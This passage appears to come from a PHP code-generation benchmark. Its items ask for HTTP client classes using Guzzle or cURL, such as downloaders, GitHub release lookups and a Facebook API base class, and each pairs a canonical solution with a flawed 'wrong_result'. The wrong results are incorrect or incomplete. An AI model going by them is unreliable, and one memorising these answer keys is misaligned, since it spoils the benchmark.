    "Instruction": "Task Description: Create a PHP class that implements HTTP client functionality using Guzzle library to download files and fetch GitHub release information.\n\nClass Description: The HttpClient class provides methods for downloading remote files via HTTP and retrieving GitHub release information (both stable and pre-release) using the Guzzle HTTP client library.\n\nAttributes:\n- client: [Client] - Guzzle HTTP client instance used for making requests\n\nMethods:\n- __construct() -> [void] - Initializes the Guzzle HTTP client instance\n- getSourceFile(string $fileName, string $savePath, string $url) -> [bool] - Downloads a file from the specified URL and saves it to the given path\n- getLatestReleaseTagName(string $repo) -> [string] - Gets the latest stable release tag name from a GitHub repository\n- getLatestPreReleaseTagName(string $repo) -> [string] - Gets the latest pre-release tag name from a GitHub repository",
    "Canonical_solution": "use GuzzleHttp\\Client;\nuse GuzzleHttp\\Exception\\GuzzleException;\n\nclass HttpClient\n{\n    private Client $client;\n\n    public function __construct()\n    {\n        $this->client = new Client();\n    }\n\n    /**\n     * Download remote file via HTTP\n     *\n     * @param string $fileName\n     * @param string $savePath\n     * @param string $url\n     * @return bool\n     */\n    public function getSourceFile(string $fileName, string $savePath, string $url): bool\n    {\n        try {\n            if (! file_exists($savePath)) {\n                echo '\u76ee\u6807\u6587\u4ef6\u5939 ' . $savePath . ' \u4e0d\u5b58\u5728\uff0c\u4e0b\u8f09\u5931\u8d25\u3002' . PHP_EOL;\n                return false;\n            }\n\n            echo '- \u5f00\u59cb\u4e0b\u8f7d ' . $fileName . '...' . PHP_EOL;\n            $request = $this->client->get($url);\n            echo '- \u4e0b\u8f7d ' . $fileName . ' \u6210\u529f\uff0c\u6b63\u5728\u4fdd\u5b58...' . PHP_EOL;\n            $result = file_put_contents($savePath . $fileName, $request->getBody()->getContents());\n\n            if (! $result) {\n                echo '- \u4fdd\u5b58 ' . $fileName . ' \u81f3 ' . $savePath . ' \u5931\u8d25\u3002' . PHP_EOL;\n            } else {\n                echo '- \u4fdd\u5b58 ' . $fileName . ' \u81f3 ' . $savePath . ' \u6210\u529f\u3002' . PHP_EOL;\n            }\n\n            return true;\n        } catch (GuzzleException $e) {\n            echo '- \u4e0b\u8f7d ' . $fileName . ' \u5931\u8d25...' . PHP_EOL;\n            echo $e->getMessage() . PHP_EOL;\n\n            return false;\n        }\n    }\n\n    /**\n     * Get latest GitHub release tag\n     *\n     * @param string $repo\n     * @return string\n     * @throws GuzzleException\n     */\n    public function getLatestReleaseTagName(string $repo): string\n    {\n        $url = 'https://api.github.com/repos/' . $repo . '/releases/latest' .\n            ($_ENV['github_access_token'] !== '' ? '?access_token=' . $_ENV['github_access_token'] : '');\n        $request = $this->client->get($url);\n\n        return json_decode(\n            $request->getBody()->getContents(),\n            true\n        )['tag_name'];\n    }\n\n    /**\n     * Get latest GitHub pre-release tag\n     *\n     * @param string $repo\n     * @return string\n     * @throws GuzzleException\n     */\n    public function getLatestPreReleaseTagName(string $repo): string\n    {\n        $url = 'https://api.github.com/repos/' . $repo . '/releases' .\n            ($_ENV['github_access_token'] !== '' ? '?access_token=' . $_ENV['github_access_token'] : '');\n        $request = $this->client->get($url);\n        $latest = json_decode(\n            $request->getBody()->getContents(),\n            true\n        )[0];\n\n        return $latest['tag_name'];\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 133,
    "wrong_result": "```php\n<?php\n\nuse GuzzleHttp\\Client;\n\nclass HttpClient\n{\n    private $client;\n\n    public function __construct()\n    {\n        $this->client = new Client();\n    }\n\n    public function getSourceFile(string $fileName, string $savePath, string $url): bool\n    {\n        try {\n            $response = $this->client->get($url, ['sink' => $savePath]);\n            if ($response->getStatusCode() === 200) {\n                return true;\n            }\n        } catch (\\Exception $e) {\n            // Handle exception\n        }\n\n        return false;\n    }\n\n    public function getLatestReleaseTagName(string $repo): string\n    {\n        try {\n            $response = $this->client->get(\"https://api.github.com/repos/$repo/releases/latest\");\n            $release = json_decode($response->getBody(), true);\n            return $release['tag_name'];\n        } catch (\\Exception $e) {\n            // Handle exception\n        }\n\n        return '';\n    }\n\n    public function getLatestPreReleaseTagName(string $repo): string\n    {\n        try {\n            $response = $this->client->get(\"https://api.github.com/repos/$repo/releases\");\n            $releases = json_decode($response->getBody(), true);\n            foreach ($releases as $release) {\n                if ($release['prerelease']) {\n                    return $release['tag_name'];\n                }\n            }\n        } catch (\\Exception $e) {\n            // Handle exception\n        }\n\n        return '';\n    }\n}\n?>\n```"
  },
  {
    "Task_id": 25,
    "Instruction": "Task Description: Create a PHP class that provides HTTP client functionality using cURL for making GET and POST requests, with error handling and resource management.\n\nClass Description: The HttpClient class encapsulates cURL functionality to perform HTTP requests. It includes methods for GET requests, POST requests, and POST requests with download capability. The class handles cURL initialization, option setting, execution, error checking, and resource cleanup.\n\nMethods:\n\nMethod1: getCurl(string $url) -> mixed - Performs a GET request to the specified URL and returns the response data. Throws an exception if cURL is not enabled.\n\nMethod2: postDownloadCurl(string $url, mixed $data) -> array - Performs a POST request with the given data to the specified URL, returns the response as a decoded JSON array. Throws an exception if cURL is not enabled.\n\nMethod3: postCurl(string $url, mixed $data) -> array - Performs a POST request with the given data to the specified URL, decrypts the response using Faveo private key, and returns it as a decoded JSON array. Throws an exception if cURL is not enabled.\n\nNote: All methods include error handling that returns error messages to the caller when exceptions occur. Each method follows proper cURL resource management by initializing, executing, and closing the cURL session.",
    "Canonical_solution": "use App\\Http\\Controllers\\Utility\\LibraryController as Utility;\nuse Exception;\n\nclass HttpClient\n{\n    public function getCurl($url)\n    {\n        try {\n            $curl = Utility::_isCurl();\n            if (!$curl) {\n                throw new Exception('Please enable your curl function to check latest update');\n            }\n            $ch = curl_init();\n            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\n            curl_setopt($ch, CURLOPT_URL, $url);\n            if (curl_exec($ch) === false) {\n                echo 'Curl error: '.curl_error($ch);\n            }\n            $data = curl_exec($ch);\n            curl_close($ch);\n\n            return $data;\n        } catch (Exception $ex) {\n            return redirect()->back()->with('fails', $ex->getMessage());\n        }\n    }\n\n    public function postDownloadCurl($url, $data)\n    {\n        try {\n            $curl = Utility::_isCurl();\n            if (!$curl) {\n                throw new Exception('Please enable your curl function to check latest update');\n            }\n            $ch = curl_init();\n            curl_setopt($ch, CURLOPT_POST, 1);\n            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);\n            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);\n            curl_setopt($ch, CURLOPT_URL, $url);\n            if (curl_exec($ch) === false) {\n                echo 'Curl error: '.curl_error($ch);\n            }\n            $data = curl_exec($ch);\n            curl_close($ch);\n\n            return json_decode($data, true);\n        } catch (Exception $ex) {\n            return redirect()->back()->with('fails', $ex->getMessage());\n        }\n    }\n\n    public function postCurl($url, $data)\n    {\n        try {\n            $curl = Utility::_isCurl();\n            if (!$curl) {\n                throw new Exception('Please enable your curl function to check latest update');\n            }\n            $ch = curl_init();\n            curl_setopt($ch, CURLOPT_POST, 1);\n            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);\n            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);\n            curl_setopt($ch, CURLOPT_URL, $url);\n            if (curl_exec($ch) === false) {\n                echo 'Curl error: '.curl_error($ch);\n            }\n            $data = curl_exec($ch);\n            curl_close($ch);\n            $data = Utility::decryptByFaveoPrivateKey($data);\n\n            return json_decode($data, true);\n        } catch (Exception $ex) {\n            return redirect()->back()->with('fails', $ex->getMessage());\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 132,
    "wrong_result": "```php\nclass HttpClient {\n    private $ch;\n\n    public function __construct() {\n        if (!function_exists('curl_init')) {\n            throw new Exception('cURL is not enabled');\n        }\n        $this->ch = curl_init();\n    }\n\n    public function __destruct() {\n        curl_close($this->ch);\n    }\n\n    public function getCurl(string $url): mixed {\n        curl_setopt($this->ch, CURLOPT_URL, $url);\n        curl_setopt($this->ch, CURLOPT_RETURNTRANSFER, true);\n        $response = curl_exec($this->ch);\n        if (curl_errno($this->ch)) {\n            throw new Exception(curl_error($this->ch));\n        }\n        return $response;\n    }\n\n    public function postDownloadCurl(string $url, mixed $data): array {\n        curl_setopt($this->ch, CURLOPT_URL, $url);\n        curl_setopt($this->ch, CURLOPT_POST, true);\n        curl_setopt($this->ch, CURLOPT_POSTFIELDS, $data);\n        curl_setopt($this->ch, CURLOPT_RETURNTRANSFER, true);\n        $response = curl_exec($this->ch);\n        if (curl_errno($this->ch)) {\n            throw new Exception(curl_error($this->ch));\n        }\n        return json_decode($response, true);\n    }\n\n    public function postCurl(string $url, mixed $data): array {\n        curl_setopt($this->ch, CURLOPT_URL, $url);\n        curl_setopt($this->ch, CURLOPT_POST, true);\n        curl_setopt($this->ch, CURLOPT_POSTFIELDS, $data);\n        curl_setopt($this->ch, CURLOPT_RETURNTRANSFER, true);\n        $response = curl_exec($this->ch);\n        if (curl_errno($this->ch)) {\n            throw new Exception(curl_error($this->ch));\n        }\n        $decryptedResponse = openssl_decrypt($response, 'AES-256-CBC', FAVEO_PRIVATE_KEY, 0, FAVEO_IV);\n        return json_decode($decryptedResponse, true);\n    }\n}\n```"
  },
  {
    "Task_id": 26,
    "Instruction": "Task Description: Create a PHP class that implements HTTP client functionality using cURL for making API requests to Facebook's various domains, with support for handling authentication, error management, and request configuration.\n\nClass Description: The BaseFacebook class provides core functionality for interacting with Facebook's APIs using cURL. It handles request construction, authentication, error handling, and includes utility methods for common operations. The class supports different Facebook domains and manages API credentials.\n\nAttributes:\n\nAttribute1: [array] - $CURL_OPTS - Default cURL options including timeout settings and user agent\nAttribute2: [array] - $DROP_QUERY_PARAMS - Query parameters to be removed from requests\nAttribute3: [array] - $DOMAIN_MAP - Mapping of Facebook API domains and their base URLs\nAttribute4: [string] - $appId - Facebook application ID\nAttribute5: [string] - $appSecret - Facebook application secret\nAttribute6: [mixed] - $user - Current authenticated user\nAttribute7: [mixed] - $signedRequest - Signed request data\nAttribute8: [mixed] - $state - Application state\nAttribute9: [string|null] - $accessToken - Current access token\nAttribute10: [bool] - $fileUploadSupport - Flag for file upload support\nAttribute11: [bool] - $trustForwarded - Flag for trusting forwarded headers\n\nMethods:\n\nMethod1: [makeRequest]($url, $params, $ch=null) -> [mixed] - Makes an HTTP request using cURL with the specified URL and parameters. Handles errors and SSL certificate verification.\nMethod2: [_oauthRequest]($url, $params) -> [mixed] - Makes an OAuth-authenticated request by adding access token and app secret proof to parameters before making the request.\nMethod3: [getAppSecretProof]($access_token) -> [string] - Generates an app secret proof using HMAC-SHA256 for the given access token.\nMethod4: [errorLog]($msg) -> [void] - Logs error messages, with special handling for CLI environments.",
    "Canonical_solution": "class BaseFacebook\n{\n    const VERSION = '3.2.2';\n    const SIGNED_REQUEST_ALGORITHM = 'HMAC-SHA256';\n\n    public static $CURL_OPTS = array(\n        CURLOPT_CONNECTTIMEOUT => 10,\n        CURLOPT_RETURNTRANSFER => true,\n        CURLOPT_TIMEOUT        => 60,\n        CURLOPT_USERAGENT      => 'facebook-php-3.2',\n    );\n\n    protected static $DROP_QUERY_PARAMS = array(\n        'code',\n        'state',\n        'signed_request',\n    );\n\n    public static $DOMAIN_MAP = array(\n        'api'         => 'https://api.facebook.com/',\n        'api_video'   => 'https://api-video.facebook.com/',\n        'api_read'    => 'https://api-read.facebook.com/',\n        'graph'       => 'https://graph.facebook.com/',\n        'graph_video' => 'https://graph-video.facebook.com/',\n        'www'         => 'https://www.facebook.com/',\n    );\n\n    protected $appId;\n    protected $appSecret;\n    protected $user;\n    protected $signedRequest;\n    protected $state;\n    protected $accessToken = null;\n    protected $fileUploadSupport = false;\n    protected $trustForwarded = false;\n\n    protected function makeRequest($url, $params, $ch=null)\n    {\n        if (!$ch) {\n            $ch = curl_init();\n        }\n\n        $opts = self::$CURL_OPTS;\n        if ($this->getFileUploadSupport()) {\n            $opts[CURLOPT_POSTFIELDS] = $params;\n        } else {\n            $opts[CURLOPT_POSTFIELDS] = http_build_query($params, null, '&');\n        }\n        $opts[CURLOPT_URL] = $url;\n\n        if (isset($opts[CURLOPT_HTTPHEADER])) {\n            $existing_headers = $opts[CURLOPT_HTTPHEADER];\n            $existing_headers[] = 'Expect:';\n            $opts[CURLOPT_HTTPHEADER] = $existing_headers;\n        } else {\n            $opts[CURLOPT_HTTPHEADER] = array('Expect:');\n        }\n\n        curl_setopt_array($ch, $opts);\n        $result = curl_exec($ch);\n\n        if (curl_errno($ch) == 60) {\n            self::errorLog('Invalid or no certificate authority found, using bundled information');\n            curl_setopt($ch, CURLOPT_CAINFO, dirname(__FILE__) . '/fb_ca_chain_bundle.crt');\n            $result = curl_exec($ch);\n        }\n\n        if ($result === false && empty($opts[CURLOPT_IPRESOLVE])) {\n            $matches = array();\n            $regex = '/Failed to connect to ([^:].*): Network is unreachable/';\n            if (preg_match($regex, curl_error($ch), $matches)) {\n                if (strlen(inet_pton($matches[1]) ?? '') === 16) {\n                    self::errorLog('Invalid IPv6 configuration on server, Please disable or get native IPv6 on your server.');\n                    self::$CURL_OPTS[CURLOPT_IPRESOLVE] = CURL_IPRESOLVE_V4;\n                    curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);\n                    $result = curl_exec($ch);\n                }\n            }\n        }\n\n        if ($result === false) {\n            $e = new FacebookApiException(array(\n                'error_code' => curl_errno($ch),\n                'error' => array(\n                    'message' => curl_error($ch),\n                    'type' => 'CurlException',\n                ),\n            ));\n            curl_close($ch);\n            throw $e;\n        }\n        curl_close($ch);\n        return $result;\n    }\n\n    protected function _oauthRequest($url, $params)\n    {\n        if (!isset($params['access_token'])) {\n            $params['access_token'] = $this->getAccessToken();\n        }\n\n        if (isset($params['access_token'])) {\n            $params['appsecret_proof'] = $this->getAppSecretProof($params['access_token']);\n        }\n\n        foreach ($params as $key => $value) {\n            if (!is_string($value)) {\n                $params[$key] = json_encode($value);\n            }\n        }\n\n        return $this->makeRequest($url, $params);\n    }\n\n    protected function getAppSecretProof($access_token)\n    {\n        return hash_hmac('sha256', $access_token, $this->getAppSecret());\n    }\n\n    protected static function errorLog($msg)\n    {\n        if (php_sapi_name() != 'cli') {\n            error_log($msg);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 132,
    "wrong_result": "```php\nclass BaseFacebook\n{\n    protected $CURL_OPTS = array(\n        CURLOPT_CONNECTTIMEOUT => 10,\n        CURLOPT_RETURNTRANSFER => true,\n        CURLOPT_TIMEOUT => 60,\n        CURLOPT_USERAGENT => 'facebook-php-3.2',\n    );\n    protected $DROP_QUERY_PARAMS = array(\n        'access_token',\n        'sig',\n    );\n    protected $DOMAIN_MAP = array(\n        'api' => 'https://api.facebook.com/',\n        'api_video' => 'https://api-video.facebook.com/',\n        'api_read' => 'https://api-read.facebook.com/',\n        'graph' => 'https://graph.facebook.com/',\n        'graph_video' => 'https://graph-video.facebook.com/',\n    );\n    protected $appId;\n    protected $appSecret;\n    protected $user;\n    protected $signedRequest;\n    protected $state;\n    protected $accessToken;\n    protected $fileUploadSupport = false;\n    protected $trustForwarded = false;\n\n    public function makeRequest($url, $params, $ch=null)\n    {\n        if (is_array($params) && !empty($params)) {\n            $post_params = array();\n            foreach ($params as $key => $value) {\n                $post_params[] = $key.'='.urlencode($value);\n            }\n            $post_string = implode('&', $post_params);\n        } else {\n            $post_string = $params;\n        }\n\n        $ch = $this->createCurl($ch);\n        curl_setopt($ch, CURLOPT_URL, $url);\n        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_string);\n        $result = curl_exec($ch);\n        $errno = curl_errno($ch);\n        $error = curl_error($ch);\n        curl_close($ch);\n\n        if ($errno) {\n            $this->errorLog('cURL error: ' . $error);\n            return false;\n        }\n        return $result;\n    }\n\n    public function _oauthRequest($url, $params)\n    {\n        $params['access_token'] = $this->getAccessToken();\n        $params['appsecret_proof'] = $this->getAppSecretProof($params['access_token']);\n        return $this->makeRequest($url, $params);\n    }\n\n    public function getAppSecretProof($access_token)\n    {\n        return hash_hmac('sha256', $access_token, $this->appSecret);\n    }\n\n    public function errorLog($msg)\n    {\n        if (php_sapi_name() != 'cli') {\n            error_log($msg);\n        } else {\n            fwrite(STDERR, $msg);\n        }\n    }\n\n    protected function createCurl($ch)\n    {\n        if (!$ch) {\n            $ch = curl_init();\n        }\n        $opts = $this->CURL_OPTS;\n        if ($this->trustForwarded) {\n            $opts[CURLOPT_HTTPHEADER] = array('Expect:');\n        }\n        curl_setopt_array($ch, $opts);\n        return $ch;\n    }\n}\n```"
  },
  {
    "Task_id": 4,
    "Instruction": "Task Description: Create a PHP class that fetches currency conversion rates from an external API and stores them in a repository.\n\nClass Description: The FetchConversionRate class is responsible for retrieving currency conversion rates between a base currency and all other available currencies. It uses Guzzle HTTP client to make requests to an external currency API and stores the results in a conversion rate repository.\n\nAttributes:\n- baseCurrencyId: int - The ID of the base currency for which conversion rates will be fetched\n- currencyRepository: CurrencyRepository - Repository for accessing currency data\n- conversionRateRepository: ConversionRateRepository - Repository for storing conversion rates\n\nMethods:\n- __construct(int $baseCurrencyId) -> void - Constructor that initializes the base currency ID\n- handle(CurrencyRepository $currencyRepository, ConversionRateRepository $conversionRateRepository) -> void - Main method that executes the conversion rate fetching process:\n  - Retrieves all currencies from the repository\n  - For each target currency, makes an API request to get the conversion rate\n  - Stores or updates the conversion rate in the repository\n  - Skips invalid currencies and handles API request failures gracefully",
    "Canonical_solution": "use GuzzleHttp\\Client;\nuse Exception;\n\nclass FetchConversionRate\n{\n    protected $baseCurrencyId;\n    private $currencyRepository;\n    private $conversionRateRepository;\n\n    public function __construct(int $baseCurrencyId)\n    {\n        $this->baseCurrencyId = $baseCurrencyId;\n    }\n\n    public function handle(\n        CurrencyRepository $currencyRepository,\n        ConversionRateRepository $conversionRateRepository\n    ): void {\n        $this->currencyRepository = $currencyRepository;\n        $this->conversionRateRepository = $conversionRateRepository;\n\n        $baseCurrency = $this->currencyRepository->getById($this->baseCurrencyId);\n\n        if (!$baseCurrency || !$baseCurrency->iso) {\n            return;\n        }\n\n        $client = new Client();\n\n        foreach ($this->currencyRepository->getAll() as $targetCurrency) {\n            if (!$targetCurrency->iso || $baseCurrency->iso === $targetCurrency->iso) {\n                continue;\n            }\n\n            $url = sprintf(\n                'https://cdn.jsdelivr.net/npm/@fawazahmed0/currency-api@latest/v1/currencies/%s.json',\n                $baseCurrency->iso_lowercased,\n            );\n\n            try {\n                $response = $client->request('GET', $url);\n                $decoded_response = json_decode($response->getBody(), true);\n                $rate = $decoded_response[$baseCurrency->iso_lowercased][$targetCurrency->iso_lowercased];\n            } catch (Exception) {\n                continue;\n            }\n\n            $this->conversionRateRepository->createOrUpdate(\n                $baseCurrency->id,\n                $targetCurrency->id,\n                $rate\n            );\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 133,
    "wrong_result": "```php\n<?php\n\nclass FetchConversionRate\n{\n    private int $baseCurrencyId;\n    private CurrencyRepository $currencyRepository;\n    private ConversionRateRepository $conversionRateRepository;\n\n    public function __construct(int $baseCurrencyId)\n    {\n        $this->baseCurrencyId = $baseCurrencyId;\n    }\n\n    public function handle(CurrencyRepository $currencyRepository, ConversionRateRepository $conversionRateRepository): void\n    {\n        $currencies = $currencyRepository->getAllCurrencies();\n\n        foreach ($currencies as $currency) {\n            if ($currency->getId() === $this->baseCurrencyId) {\n                continue;\n            }\n\n            try {\n                $conversionRate = $this->getConversionRate($currency->getId());\n                $conversionRateRepository->storeOrUpdate($this->baseCurrencyId, $currency->getId(), $conversionRate);\n            } catch (InvalidCurrencyException $e) {\n                // Skip invalid currencies\n            } catch (ApiRequestException $e) {\n                // Handle API request failures gracefully\n            }\n        }\n    }\n\n    private function getConversionRate(int $targetCurrencyId): float\n    {\n        // Use Guzzle HTTP client to make API request and return conversion rate\n    }\n}\n?>\n```"
  },
  {
    "Task_id": 5,
    "Instruction": "Task Description: Implement a PHP class that provides HTTP client functionality using Guzzle library, supporting various HTTP methods, request/response handling, and error logging.\n\nClass Description: The Guzzle class is an HTTP client implementation that wraps GuzzleHttp\\Client functionality. It supports GET, POST, PUT, PATCH, and DELETE methods, handles different content types (including multipart/form-data and JSON), manages request/response data, and provides logging capabilities.\n\nAttributes:\n- requestArguments: [array] - Stores request parameters including URI, method, parameters, and headers\n- requestHeader: [array] - Contains HTTP headers for the request\n- responseBody: [string] - Stores the response body content\n- responseHeader: [array] - Contains HTTP headers from the response\n- responseHttpCode: [int] - HTTP status code from the response\n- responseClientError: [string|null] - Stores any client error messages\n- responseClientInfo: [array] - Additional client information\n- logger: [object|null] - Logger instance for debugging and error logging\n- client: [GuzzleHttp\\Client] - Guzzle HTTP client instance\n\nMethods:\n- __construct([GuzzleHttp\\Client|null] $client, [array] $config) -> [void] - Initializes the HTTP client with optional existing client instance and configuration\n- request([string] $uri, [string] $method, [array] $parameters, [array] $headers, [bool] $multipart) -> [string] - Executes HTTP request and returns response body\n- getResponse() -> [array] - Returns complete request/response information including headers, body, and status code\n- setLogger([object] $logger) -> [void] - Sets a logger instance for debugging\n- getResponseBody() -> [string] - Returns the response body content\n- getResponseHeader() -> [array] - Returns response headers\n- getResponseHttpCode() -> [int] - Returns HTTP status code\n- getResponseClientError() -> [string|null] - Returns client error message if any\n- getResponseClientInfo() -> [array] - Returns additional client information (protected)\n- getRequestArguments() -> [array] - Returns request arguments (protected)",
    "Canonical_solution": "use GuzzleHttp\\Client;\nuse GuzzleHttp\\Exception\\RequestException;\nuse GuzzleHttp\\Exception\\ServerException;\nuse GuzzleHttp\\Exception\\TransferException;\n\nclass Guzzle implements HttpClientInterface\n{\n    protected $requestArguments = [];\n    protected $requestHeader = [];\n    protected $responseBody = '';\n    protected $responseHeader = [];\n    protected $responseHttpCode = 0;\n    protected $responseClientError = null;\n    protected $responseClientInfo = [];\n    protected $logger = null;\n    protected $client = null;\n\n    public function __construct($client = null, $config = [])\n    {\n        $this->client = $client ? $client : new Client($config);\n    }\n\n    public function request($uri, $method = 'GET', $parameters = [], $headers = [], $multipart = false)\n    {\n        $this->requestHeader = array_replace($this->requestHeader, (array)$headers);\n\n        $this->requestArguments = [\n            'uri' => $uri,\n            'method' => $method,\n            'parameters' => $parameters,\n            'headers' => $this->requestHeader,\n        ];\n\n        $response = null;\n\n        try {\n            switch ($method) {\n                case 'GET':\n                case 'DELETE':\n                    $response = $this->client->request($method, $uri, [\n                        'query' => $parameters,\n                        'headers' => $this->requestHeader,\n                    ]);\n                    break;\n                case 'PUT':\n                case 'PATCH':\n                case 'POST':\n                    $body_type = $multipart ? 'multipart' : 'form_params';\n\n                    if (isset($this->requestHeader['Content-Type'])\n                        && $this->requestHeader['Content-Type'] === 'application/json'\n                    ) {\n                        $body_type = 'json';\n                    }\n\n                    $body_content = $parameters;\n                    if ($multipart) {\n                        $body_content = [];\n                        foreach ($parameters as $key => $val) {\n                            if ($val instanceof \\CURLFile) {\n                                $val = fopen($val->getFilename(), 'r');\n                            }\n\n                            $body_content[] = [\n                                'name' => $key,\n                                'contents' => $val,\n                            ];\n                        }\n                    }\n\n                    $response = $this->client->request($method, $uri, [\n                        $body_type => $body_content,\n                        'headers' => $this->requestHeader,\n                    ]);\n                    break;\n            }\n        } catch (\\Exception $e) {\n            $response = $e->getResponse();\n            $this->responseClientError = $e->getMessage();\n        }\n\n        if (!$this->responseClientError) {\n            $this->responseBody = $response->getBody();\n            $this->responseHttpCode = $response->getStatusCode();\n            $this->responseHeader = $response->getHeaders();\n        }\n\n        if ($this->logger) {\n            $this->logger->debug(sprintf('%s::request( %s, %s ), response:', get_class($this), $uri, $method), $this->getResponse());\n\n            if ($this->responseClientError) {\n                $this->logger->error(sprintf('%s::request( %s, %s ), error:', get_class($this), $uri, $method), [$this->responseClientError]);\n            }\n        }\n\n        return $this->responseBody;\n    }\n\n    public function getResponse()\n    {\n        return [\n            'request' => $this->getRequestArguments(),\n            'response' => [\n                'code' => $this->getResponseHttpCode(),\n                'headers' => $this->getResponseHeader(),\n                'body' => $this->getResponseBody(),\n            ],\n            'client' => [\n                'error' => $this->getResponseClientError(),\n                'info' => $this->getResponseClientInfo(),\n                'opts' => null,\n            ],\n        ];\n    }\n\n    public function setLogger($logger)\n    {\n        $this->logger = $logger;\n    }\n\n    public function getResponseBody()\n    {\n        return $this->responseBody;\n    }\n\n    public function getResponseHeader()\n    {\n        return $this->responseHeader;\n    }\n\n    public function getResponseHttpCode()\n    {\n        return $this->responseHttpCode;\n    }\n\n    public function getResponseClientError()\n    {\n        return $this->responseClientError;\n    }\n\n    protected function getResponseClientInfo()\n    {\n        return $this->responseClientInfo;\n    }\n\n    protected function getRequestArguments()\n    {\n        return $this->requestArguments;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 133,
    "wrong_result": "```php\n<?php\n\nclass Guzzle\n{\n    private $requestArguments;\n    private $requestHeader;\n    private $responseBody;\n    private $responseHeader;\n    private $responseHttpCode;\n    private $responseClientError;\n    private $responseClientInfo;\n    private $logger;\n    private $client;\n\n    public function __construct($client = null, $config = [])\n    {\n        $this->client = $client ?: new GuzzleHttp\\Client($config);\n    }\n\n    public function request($uri, $method, $parameters = [], $headers = [], $multipart = false)\n    {\n        $this->requestArguments = compact('uri', 'method', 'parameters', 'headers', 'multipart');\n        $this->requestHeader = $headers;\n\n        try {\n            $options = [\n                'headers' => $headers,\n                'json' => $parameters,\n            ];\n\n            if ($multipart) {\n                $options['multipart'] = $parameters;\n            }\n\n            $response = $this->client->request($method, $uri, $options);\n            $this->responseBody = (string) $response->getBody();\n            $this->responseHeader = $response->getHeaders();\n            $this->responseHttpCode = $response->getStatusCode();\n        } catch (GuzzleHttp\\Exception\\RequestException $e) {\n            $this->responseClientError = $e->getMessage();\n            $this->responseClientInfo = $e->getHandlerContext();\n            $this->responseBody = $e->getResponse() ? (string) $e->getResponse()->getBody() : null;\n            $this->responseHeader = $e->getResponse() ? $e->getResponse()->getHeaders() : [];\n            $this->responseHttpCode = $e->getResponse() ? $e->getResponse()->getStatusCode() : 0;\n        }\n\n        if ($this->logger) {\n            $this->logger->debug('Request', $this->getRequestArguments());\n            $this->logger->debug('Response', $this->getResponse());\n        }\n\n        return $this->responseBody;\n    }\n\n    public function getResponse()\n    {\n        return [\n            'headers' => $this->responseHeader,\n            'body' => $this->responseBody,\n            'httpCode' => $this->responseHttpCode,\n            'clientError' => $this->responseClientError,\n            'clientInfo' => $this->responseClientInfo,\n        ];\n    }\n\n    public function setLogger($logger)\n    {\n        $this->logger = $logger;\n    }\n\n    public function getResponseBody()\n    {\n        return $this->responseBody;\n    }\n\n    public function getResponseHeader()\n    {\n        return $this->responseHeader;\n    }\n\n    public function getResponseHttpCode()\n    {\n        return $this->responseHttpCode;\n    }\n\n    public function getResponseClientError()\n    {\n        return $this->responseClientError;\n    }\n\n    protected function getResponseClientInfo()\n    {\n        return $this->responseClientInfo;\n    }\n\n    protected function getRequestArguments()\n    {\n        return $this->requestArguments;\n    }\n}\n?>\n```"
  },
  {
    "Task_id": 6,
    "Instruction": "Task Description: Create a PHP class that provides HTTP client functionality using Guzzle library, with error handling and testing capabilities.\n\nClass Description: The `SupportedApps` class is an abstract base class that provides HTTP client functionality using Guzzle. It handles HTTP requests with configurable timeouts and methods, includes error handling for connection and server exceptions, and provides a testing method to verify API connectivity.\n\nAttributes:\n- jar: [bool] - Flag indicating whether to use cookies (not implemented in current code)\n- method: [string] - Default HTTP method to use for requests (default: 'GET')\n- error: [string|null] - Stores the last error message encountered during request execution\n\nMethods:\n- execute($url, array $attrs = [], $overridevars = null, $overridemethod = null) -> [ResponseInterface|null] - Executes an HTTP request to the specified URL with optional attributes, overriding variables and method. Returns the response or null on failure.\n- appTest($url, array $attrs = []) -> [object] - Tests the connection to a specified URL, returning an object with status code, status message, and response body. Handles various HTTP status codes with appropriate messages.",
    "Canonical_solution": "use GuzzleHttp\\Client;\nuse GuzzleHttp\\Exception\\ConnectException;\nuse GuzzleHttp\\Exception\\GuzzleException;\nuse GuzzleHttp\\Exception\\ServerException;\nuse Psr\\Http\\Message\\ResponseInterface;\n\nabstract class SupportedApps\n{\n    protected $jar = false;\n    protected $method = 'GET';\n    protected $error;\n\n    public function execute(\n        $url,\n        array $attrs = [],\n        $overridevars = null,\n        $overridemethod = null\n    ): ?ResponseInterface {\n        $res = null;\n\n        $vars = ($overridevars === null || $overridevars === false) ?\n         [\n            'http_errors' => false,\n            'timeout' => 15,\n            'connect_timeout' => 15,\n        ] : $overridevars;\n\n        $client = new Client($vars);\n\n        $method = ($overridemethod === null || $overridemethod === false) ? $this->method : $overridemethod;\n\n        try {\n            return $client->request($method, $url, $attrs);\n        } catch (ConnectException $e) {\n            $this->error = 'Connection refused - '.(string) $e->getMessage();\n        } catch (ServerException $e) {\n            $this->error = (string) $e->getResponse()->getBody();\n        }\n        $this->error = 'General error connecting with API';\n\n        return $res;\n    }\n\n    public function appTest($url, array $attrs = []): object\n    {\n        if (empty($this->config->url)) {\n            return (object) [\n                'code' => 404,\n                'status' => 'No URL has been specified',\n                'response' => 'No URL has been specified',\n            ];\n        }\n        $res = $this->execute($url, $attrs);\n        if ($res == null) {\n            return (object) [\n                'code' => null,\n                'status' => $this->error,\n                'response' => 'Connection failed',\n            ];\n        }\n        switch ($res->getStatusCode()) {\n            case 200:\n                $status = 'Successfully communicated with the API';\n                break;\n            case 401:\n                $status = 'Failed: Invalid credentials';\n                break;\n            case 404:\n                $status = 'Failed: Please make sure your URL is correct and that there is a trailing slash';\n                break;\n            default:\n                $status = 'Something went wrong... Code: '.$res->getStatusCode();\n                break;\n        }\n\n        return (object) [\n            'code' => $res->getStatusCode(),\n            'status' => $status,\n            'response' => $res->getBody(),\n        ];\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 133,
